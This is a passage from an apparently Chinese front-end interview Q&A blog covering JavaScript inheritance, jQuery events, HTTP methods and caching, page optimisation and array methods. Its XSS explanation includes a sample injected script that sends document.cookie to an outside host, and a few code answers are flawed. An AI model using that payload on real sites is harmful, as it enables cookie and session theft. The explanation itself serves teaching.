class="line">       hello</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script&gt;</span></span><br><span class="line"><span class="regexp">    Object.prototype.outerHTML = function() &#123;</span></span><br><span class="line"><span class="regexp">      var innerCon = this.innerHTML, /</span><span class="regexp">/获得里面的内容</span></span><br><span class="line"><span class="regexp">      outerCon = this.appendChild(innerCon); /</span><span class="regexp">/添加到里面</span></span><br><span class="line"><span class="regexp">      alert(outerCon); </span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    function $(id)&#123;</span></span><br><span class="line"><span class="regexp">      return document.getElementById(id);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    alert($('outer').innerHTML);</span></span><br><span class="line"><span class="regexp">    alert($('outer').outerHTML);</span></span><br><span class="line"><span class="regexp">  &lt;/</span>script&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><h2 id="JS中的简单继承-call方法！"><a href="#JS中的简单继承-call方法！" class="headerlink" title="JS中的简单继承 call方法！"></a>JS中的简单继承 call方法！</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意：类名都是首字母大写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name, money</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.money = money;</span><br><span class="line">  <span class="keyword">this</span>.info = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'姓名： '</span>+<span class="keyword">this</span>.name+<span class="string">' 钱： '</span>+ <span class="keyword">this</span>.money);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义孩子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Children</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>, name); <span class="comment">//继承 姓名属性，不要钱。  </span></span><br><span class="line">  <span class="keyword">this</span>.info = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'姓名： '</span>+<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化类</span></span><br><span class="line"><span class="keyword">var</span> per = <span class="keyword">new</span> Parent(<span class="string">'parent'</span>, <span class="number">800000000000</span>);</span><br><span class="line"><span class="keyword">var</span> chi = <span class="keyword">new</span> Children(<span class="string">'child'</span>);</span><br><span class="line">per.info();</span><br><span class="line">chi.info();</span><br></pre></td></tr></table></figure><h2 id="bind-live-delegate-的区别"><a href="#bind-live-delegate-的区别" class="headerlink" title="bind(), live(), delegate()的区别"></a>bind(), live(), delegate()的区别</h2><blockquote><p>bind： 绑定事件，对新添加的事件不起作用，方法用于将一个处理程序附加到每个匹配元素的事件上并返回jQuery对象。<br>live： 方法将一个事件处理程序附加到与当前选择器匹配的所有元素（包含现有的或将来添加的）的指定事件上并返回jQuery对象。<br>delegate： 方法基于一组特定的根元素将处理程序附加到匹配选择器的所有元素（现有的或将来的）的一个或多个事件上。</p></blockquote><h2 id="如何优化自己的代码"><a href="#如何优化自己的代码" class="headerlink" title="如何优化自己的代码"></a>如何优化自己的代码</h2><blockquote><p>代码重用<br>避免全局变量（命名空间，封闭空间，模块化mvc..）<br>拆分函数避免函数过于臃肿<br>注释</p></blockquote><h2 id="怎样实现两栏等高"><a href="#怎样实现两栏等高" class="headerlink" title="怎样实现两栏等高"></a>怎样实现两栏等高</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=<span class="string">"container"</span> style=<span class="string">"display: table; width: 100%;"</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">"left"</span> style=<span class="string">"background-color: red; display: table-cell;"</span>&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div style="display:table-cell;"&gt;&lt;/</span>div&gt;</span><br><span class="line">    &lt;div id=<span class="string">"right"</span> style=<span class="string">"background-color: blue;display: table-cell"</span>&gt;</span><br><span class="line">        内容</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><h2 id="使用js实现这样的效果"><a href="#使用js实现这样的效果" class="headerlink" title="使用js实现这样的效果"></a>使用js实现这样的效果</h2><p>在文本域里输入文字时，当按下enter键时不换行，而是替换成 <code>\{\{enter\}\}</code>, (只需要考虑在行尾按下enter键的情况).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    function back(ele,event)&#123;</span><br><span class="line">      event = event || window.event;</span><br><span class="line">      if(event.keyCode==13)&#123;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">        ele.value+=&quot;&#123;&#123;enter&#125;&#125;&quot;</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;textarea rows=&quot;3&quot; cols=&quot;40&quot; id=&quot;te&quot; onkeypress=&quot;back(this,event);&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="以下代码中end字符串什么时候输出"><a href="#以下代码中end字符串什么时候输出" class="headerlink" title="以下代码中end字符串什么时候输出"></a>以下代码中end字符串什么时候输出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var t=true;</span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line">  console.log(123);</span><br><span class="line">  t = false;</span><br><span class="line">&#125;, 1000);</span><br><span class="line">while(t)&#123;&#125;</span><br><span class="line">console.log(&apos;end&apos;);</span><br></pre></td></tr></table></figure><blockquote><p>结果：永远不输出</p></blockquote><h2 id="实现specify函数"><a href="#实现specify函数" class="headerlink" title="实现specify函数"></a>实现specify函数</h2><p><code>specify(&#39;hello,world&#39;) // =&gt;&#39;h,e,l,l,o,w,o,r,l,d&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function specify(str)&#123;</span><br><span class="line">  var tempArray =  Array.prototype.filter.call(str,function (value, index, array) &#123;</span><br><span class="line">      return value &gt;= &apos;A&apos; &amp;&amp;  value &lt;= &apos;z&apos; &amp;&amp; value != &quot;_&quot;;</span><br><span class="line">  &#125;);</span><br><span class="line">  return tempArray.join(&quot;,&quot;);</span><br><span class="line">&#125;</span><br><span class="line">console.log(specify(&quot;hedd____df*(%$#a !!!))))))llo,Wo@@@r        ld&quot;)); //h,e,l,l,o,W,o,r,l,d</span><br></pre></td></tr></table></figure><h2 id="简述-readyonly-与-disabled-的区别"><a href="#简述-readyonly-与-disabled-的区别" class="headerlink" title="简述 readyonly 与 disabled 的区别"></a>简述 readyonly 与 disabled 的区别</h2><p>ReadOnly 和 Disabled的作用是使用户不能够更改表单域中的内容.</p><p>但是二者还是有着一些区别的：</p><p>1、Readonly只针对input(text/password)和textarea有效，而disabled对于所有的表单元素有效，包括select,radio,checkbox,button等。</p><p>2、在表单元素使用了disabled后，我们将表单以POST或者GET的方式提交的话，这个元素的值不会被传递出去，而readonly会将该值传递出去</p><h2 id="解释ajax的工作原理"><a href="#解释ajax的工作原理" class="headerlink" title="解释ajax的工作原理"></a>解释ajax的工作原理</h2><blockquote><p>Ajax的工作原理相当于在用户和服务器之间加了—个中间层，使用户操作与服务器响应异步化;<br>这样把以前的一些服务器负担的工作转嫁到客户端，利于客户端闲置的处理能力来处理;<br>减轻服务器和带宽的负担，从而达到节约 ISP 的空间及带宽租用成本的目的。<br>简单来说通过 XmlHttpRequest 对象来向服务器发异步请求<br>从服务器获得数据<br>然后用javascript来操作DOM而更新页面</p></blockquote><p>这其中最关键的一步就是从服务器获得请求数据。要清楚这个过程和原理，我们必须对 XMLHttpRequest有所了解。</p><h2 id="为什么扩展javascript内置对象不是好的做法？"><a href="#为什么扩展javascript内置对象不是好的做法？" class="headerlink" title="为什么扩展javascript内置对象不是好的做法？"></a>为什么扩展javascript内置对象不是好的做法？</h2><p>因为你不知道哪一天浏览器或javascript本身就会实现这个方法，而且和你扩展的实现有不一致的表现。到时候你的javascript代码可能已经在无数个页面中执行了数年，而浏览器的实现导致所有使用扩展原型的代码都崩溃了。。。</p><h2 id="什么是三元表达式？"><a href="#什么是三元表达式？" class="headerlink" title="什么是三元表达式？"></a>什么是三元表达式？</h2><p>三元运算符:</p><p>三元如名字表示的三元运算符需要三个操作数。</p><blockquote><p>语法是 <code>条件 ? 结果1 : 结果2;</code></p></blockquote><p>这里你把条件写在问号(?)的前面后面跟着用冒号(:)分隔的结果1和结果2。满足条件时结果1否则结果2。</p><h2 id="HTTP协议中，GET和POST有什么区别？分别适用什么场景-？"><a href="#HTTP协议中，GET和POST有什么区别？分别适用什么场景-？" class="headerlink" title="HTTP协议中，GET和POST有什么区别？分别适用什么场景 ？"></a>HTTP协议中，GET和POST有什么区别？分别适用什么场景 ？</h2><ul><li>GET没有请求主体，使用xhr.send(null)</li><li>GET可以通过在请求URL上添加请求参数</li><li>POST可以通过xhr.send(‘name=itcast&amp;age=10’)</li><li>POST需要设置</li><li>GET效率更好（应用多）</li><li>GET大小限制约4K，POST则没有限制</li></ul><h2 id="HTTP状态消息200-302-304-403-404-500分别表示什么"><a href="#HTTP状态消息200-302-304-403-404-500分别表示什么" class="headerlink" title="HTTP状态消息200 302 304 403 404 500分别表示什么"></a>HTTP状态消息200 302 304 403 404 500分别表示什么</h2><ul><li>200 代表成功</li><li>304 文档未修改</li><li>403 没有权限</li><li>404 未找到</li><li>500 服务器错误</li></ul><h2 id="HTTP协议中，header-信息里面，怎么控制页面失效时间（last-modified-cache-control-Expires分别代表什么）"><a href="#HTTP协议中，header-信息里面，怎么控制页面失效时间（last-modified-cache-control-Expires分别代表什么）" class="headerlink" title="HTTP协议中，header 信息里面，怎么控制页面失效时间（last-modified, cache-control, Expires分别代表什么）"></a>HTTP协议中，header 信息里面，怎么控制页面失效时间（last-modified, cache-control, Expires分别代表什么）</h2><p>last-modified 文档的最后改动时间。</p><p>客户可以通过 If-Modified-Since 请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。<br>Last-Modified 也可用 setDateHeader 方法来设置。</p><p>cache-control 告诉所有的缓存机制是否可以缓存及哪种类型</p><p>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？</p><p><a href="http://blog.chinaunix.net/" target="_blank" rel="noopener">header标头说明</a></p><h2 id="业界常用的优化-WEB-页面加载速度的方法（可以分别从页面元素展现，请求连接，css-js-服务器等方面介绍）"><a href="#业界常用的优化-WEB-页面加载速度的方法（可以分别从页面元素展现，请求连接，css-js-服务器等方面介绍）" class="headerlink" title="业界常用的优化 WEB 页面加载速度的方法（可以分别从页面元素展现，请求连接，css,js,服务器等方面介绍）"></a>业界常用的优化 WEB 页面加载速度的方法（可以分别从页面元素展现，请求连接，css,js,服务器等方面介绍）</h2><p>1) 优化图像，使用 CSS Sprites 整合图像<br>2) 去掉不必要的插件<br>3) 减少DNS查询(DNS lookups)<br>4) 最小化重定向，重定向增加了额外的HTTP请求<br>5) 使用内容分发网络（Content Delivery Network CDN）<br>6) 把CSS文件放在页面顶部，而JS文件放在底部<br>7) 利用浏览器缓存<br>8) 压缩CSS和JavaScript<br>9) 启用GZIP压缩</p><blockquote><p>使用良好的结构;<br>不要使布局超载;<br>不要使用图像来表示文本，图像进行导航不利于 SEO;<br>检查 cookie 使用情况;<br>尽可能避免使用表格;<br>删除任何不必要的元素;<br>一些优化网页的技巧;<br>压缩和缩小 JavaScript 文件;<br>设置图像大小;<br>将 CSS 图像映射用于装饰功能;<br>尽可能延迟脚本加载;<br>按需加载 JavaScript 文件;<br>优化 CSS 文件;<br>使用内容分布网络;<br>对资产使用多个域来增加连接;<br>在合适的时候使用 Google Gears;<br>使用 PNG 格式的图像;<br>保持 Ajax 调用简短、准确;<br>进行一次较大的 Ajax 调用并在本地处理客户机数据;<br>在沙箱中测试代码;<br>分析站点代码;<br>使用 JSLint 检查 JavaScript 代码中的错误或糟糕的编码实践;<br>检查孤立的文件和丢失的图像 ;<br>YSlow 扩展：使用 YSlow 分析网页;</p></blockquote><p><a href="http://www.cnblogs.com/xp796/p/5236945.html" target="_blank" rel="noopener">25种提高网页加载速度的方法和技巧</a></p><h2 id="列举常用的-web-页面开发，调试以及优化工具"><a href="#列举常用的-web-页面开发，调试以及优化工具" class="headerlink" title="列举常用的 web 页面开发，调试以及优化工具"></a>列举常用的 web 页面开发，调试以及优化工具</h2><p>开发工具：PS、FireWorks、WebStrom、SubLime Text、Eclipse、Aptana、DreamWeaver、NotePad++、Yslow<br>调试工具：谷歌浏览器、火狐 FireBug、IETester、HTTPWatch Stadio<br>优化工具：gulp、grunt、webpack<br>使用率较高的框架有 jQuery、YUI、Prototype、Dojo、Ext.js、Mootools等。尤其是jQuery，超过91%。<br>轻量级框架有 Modernizr、underscore.js、backbone.js、Raphael.js等。</p><h2 id="解释什么是sql注入，xss漏洞"><a href="#解释什么是sql注入，xss漏洞" class="headerlink" title="解释什么是sql注入，xss漏洞"></a>解释什么是sql注入，xss漏洞</h2><p>所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。<br>在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。</p><p>XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。<br>它指的是恶意攻击者往Web页面里插入恶意脚本代码，而程序对于用户输入内容未过滤；当用户浏览该页之时，嵌入其中Web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。<br>1)恶意用户，在一些公共区域（例如，建议提交表单或消息公共板的输入表单）输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是他们要输入的文本，同时还包括一些可以在客户端执行的脚本。<br>如：<code>http://xxx.xxx.com.cn/intf/_photos.jsp?callback=&lt;script&gt;window.location.href=&quot;http://www.baidu.com?a=&quot; + escape(document.cookie)&lt;/script&gt;、参数&lt;script&gt;xxx&lt;/script&gt;</code>如果这里没有经过转义处理，则页面中就嵌入了一段script。<br>2)恶意提交这个表单<br>3)其他用户看到这个包括恶意脚本的页面并执行，获取用户的cookie等敏感信息。</p><h2 id="请列举js数组类型中的常用方法"><a href="#请列举js数组类型中的常用方法" class="headerlink" title="请列举js数组类型中的常用方法"></a>请列举js数组类型中的常用方法</h2><ul><li>push();<ul><li>尾部追加一个或多个元素，push 一个元素与给数组 a[a.length] 赋值一样；</li><li>返回新数组长度</li><li>操作原数组，末尾追加</li></ul></li><li>pop();<ul><li>删除数组中最后一个元素，</li><li>返回值是被删除的这个元素</li><li>操作原数组</li></ul></li><li>shift();<ul><li>删除数组中的第一个元素，</li><li>返回值是被删除的元素</li></ul></li><li>unshift();<ul><li>向数组中第一个元素之前插入一个或多个新的元素</li><li>返回值是新数组的长度</li></ul></li><li>concat(); Array.concat() 方法创建并返回新数组<ul><li>新的数组和旧的数组拼接，产生一个新的数组</li><li>不修改原数组</li></ul></li><li>slice(); Array.slice()方法返回指定数组的一个片段或子数组<ul><li>两个参数： 开始索引，结束索引，返回包含开始索引，不包含结束索引位置之间的所有数组元素；</li><li>指定一个参数，返回包含开始位置到数组结尾的所有元素</li><li>参数是负数，相对于最后一个位置的。如参数 -1 指定了最后一个元素，-2 是倒数第二个</li><li>从原来的数组中截取出来指定的一部分元素，产生新的数组</li><li>不操作原数组</li></ul></li><li>splice(); Array.splice()是数组中插入或删除元素的方法。<ul><li>会修改调用数组，</li><li>第一个参数是开始的下标,第二个参数是指定了删除原数组元素的个数；</li><li>如果省略了第二个参数，从开始索引位置后的元素都被删除；</li><li>可以有第三个参数，第四个参数…跟在第二个参数后的任意多个参数是需要插入原数组中的元素，从第一个参数指定的索引位置插入；</li><li>该方法返回的是删除元素组成的数组,如果没有替换则返回空数组。</li></ul></li><li>join(); 将数组中的所有元素都转化成字符串并连接到一起<ul><li>返回最终生成的字符串</li><li>是 String.split() 方法的逆向操作。String.split() 是将字符串分隔成分隔，返回数组；</li></ul></li><li>reverse();<ul><li>反转数组</li><li>操作原数组</li><li>返回操作后的逆向数组</li></ul></li><li>sort(); Array.sort() 方法将数组中的元素排序并返回排序后的数组<ul><li>操作原数组；</li><li>返回排序后的数组</li></ul></li><li>toString()<ul><li>和不使用任何参数调用 join() 方法返回的字符串是一样的。</li></ul></li><li>toLocalString() 方法是 toString() 方法的本地化版本，使用本地    化分隔符将这些字符串连接起来生成最终字符串。</li><li>indexOf()和lastIndexOf(); 搜索整个数组中具有给定值的元素<ul><li>查找某个元素，</li><li>第一个参数是要查找的元素,</li><li>第二个参数是开始查找的下标,</li><li>找到则返回找到的第一个元素的索引，找不到则返回-1</li></ul></li><li>lastIndexOf();<ul><li>这个方法也是查找元素,从后面向前面找,找到则返回对应的下标,找不到则返回-1；</li><li>第二个元素可以是负数，代表相对数组末尾的偏移量；</li></ul></li><li>every() 和 some(); 数组的逻辑判定，传入一个函数,判断每个数组中的元素是否满足条件；<ul><li>every() 方法针对所有的元素判断调用函数返回全为 true，则返回true；</li><li>every() 方法有一个不满足条件的则返回 false</li><li>some() 方法所有的元素判断调用函数有一个满足条件的则返回 true</li><li>some() 方法全为 false, 则返回 false</li></ul></li><li>map() 方法，将调用的数组的每个元素传递给指定的函数，并返回一个  包含该函数的数组。<ul><li>返回新数组</li><li>不修改原数组</li><li>稀疏数组调用返回的还是稀疏数组<ul><li>一个例子：arr.map(Math.sqrt);<ul><li>map这个方法可以传入一个回调函数,</li><li>直接传入了一个Math.sqrt方法,sqrt方法是为某个数字开平方的</li><li>调用map方法传入Math.sqrt的时候,去掉了括号,也没有传入参数</li><li>map方法内部帮我们遍历并且传入数组的每个元素</li></ul></li></ul></li></ul></li><li>filter() 方法，返回的是调用的数组的一个子集，传递的回调函数用来逻辑判断，该函数的返回值是布尔值；<ul><li>压缩空缺或并删除 undefined 和 null 元素，也可以使用 filter();</li></ul></li><li>instanceof</li><li>isArray(); ECMAScript 5 中给出的检测数组类型的方法；<ul><li>这个方法是判断变量是不是数组</li></ul></li><li>forEach 方法，从头至尾遍历数组，为每个元素调用指定的函数；<ul><li>三个参数，数值元素、数组索引、数组本身</li><li>无法再所有元素传递完调用函数之前终止遍历</li></ul></li><li>reduce()和 reduceRight()<ul><li>reduce() 和 reduceRight() 方法使用指定的函数将数组元素进行组合，生成单个值。</li><li>reduce() 两个参数：<ul><li>第一个是执行简化操作的函数。化简函数的任务就是用某种方法把两个值组合和化简为一个值，并返回简化后的值。</li><li>第二个参数是可选参数</li></ul></li><li>reduceRight() 的工作原理和 reduce() 一样，不同的是它按照数组索引从高到低处理数组；</li></ul></li></ul><h2 id="ECMAScript-6-中数组新方法"><a href="#ECMAScript-6-中数组新方法" class="headerlink" title="ECMAScript 6 中数组新方法"></a>ECMAScript 6 中数组新方法</h2><ul><li>Array.prototype.find 方法用于找出第一个符合条件的数组成员。<ul><li>参数是一个回调函数，找到第一个返回 true 的数组项，然后返回该数组项；</li><li>找不到返回undefined；</li></ul></li><li>两个静态方法<ul><li>Array.from<ul><li>将一个伪数组转成正真的数组</li></ul></li><li>Array.of<ul><li>将方法中参数都添加到一个数组中</li></ul></li></ul></li><li>操作、填充和过滤数组的方法<ul><li>Array.prototype.copyWidthin</li><li>Array.prototype.fill</li><li>Array.prototype.find<ul><li>接收一个回调函数，每一项执行调用它</li></ul></li><li>Array.prototype.findIndex</li></ul></li><li>有关数组迭代的方法<ul><li>Array.prototype.keys</li><li>Array.prototype.values</li><li>Array.prototype.entries</li><li>Array.prototype[Symbol.iterator]</li></ul></li></ul><h2 id="FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素"><a href="#FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素" class="headerlink" title="FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素"></a>FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stopPropagation</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">  e = e || <span class="built_in">window</span>.event;  </span><br><span class="line">  <span class="keyword">if</span>(e.stopPropagation) &#123; <span class="comment">//W3C阻止冒泡方法  </span></span><br><span class="line">    e.stopPropagation();  </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    e.cancelBubble = <span class="literal">true</span>; <span class="comment">//IE阻止冒泡方法  </span></span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'need_hide'</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">  stopPropagation(e);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="列举常用的js框架以及分别适用的领域"><a href="#列举常用的js框架以及分别适用的领域" class="headerlink" title="列举常用的js框架以及分别适用的领域"></a>列举常用的js框架以及分别适用的领域</h2><p>jQuery 库 DOM 操作<br>Bootstrap 是 UI 组件，响应式布局<br>Angular 框架单页应用程序 SPA</p><p>库的特点</p><ul><li>选择器（Selector）</li><li>DOM 遍历</li><li>DOM 操作</li><li>实用（Utility）函数</li><li>事件处理</li><li>Ajax</li></ul><h2 id="js中如何实现一个map"><a href="#js中如何实现一个map" class="headerlink" title="js中如何实现一个map"></a>js中如何实现一个map</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html &gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;无标题文档&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;script language="javascript"&gt;</span></span><br><span class="line"><span class="regexp">  Array.prototype.remove = function(s) &#123;</span></span><br><span class="line"><span class="regexp">    for (var i = 0; i &lt; this.length; i++) &#123;</span></span><br><span class="line"><span class="regexp">      if (s == this[i]) this.splice(i, 1);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  function Map() &#123;</span></span><br><span class="line"><span class="regexp">    /</span>** 存放键的数组(遍历用到) *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    this.keys = new Array();</span></span><br><span class="line"><span class="regexp">    /</span>** 存放数据 *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    this.data = new Object();</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 放入一个键值对</span></span><br><span class="line"><span class="regexp">    this.put = function(key, value) &#123;</span></span><br><span class="line"><span class="regexp">      if(this.data[key] == null)&#123;</span></span><br><span class="line"><span class="regexp">        this.keys.push(key);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      this.data[key] = value;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取某键对应的值</span></span><br><span class="line"><span class="regexp">    this.get = function(key) &#123;</span></span><br><span class="line"><span class="regexp">      return this.data[key];</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 删除一个键值对</span></span><br><span class="line"><span class="regexp">    this.remove = function(key) &#123;</span></span><br><span class="line"><span class="regexp">      this.keys.remove(key);</span></span><br><span class="line"><span class="regexp">      this.data[key] = null;</span></span><br><span class="line"><span class="regexp">    &#125;; </span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 遍历Map,执行处理函数</span></span><br><span class="line"><span class="regexp">    this.each = 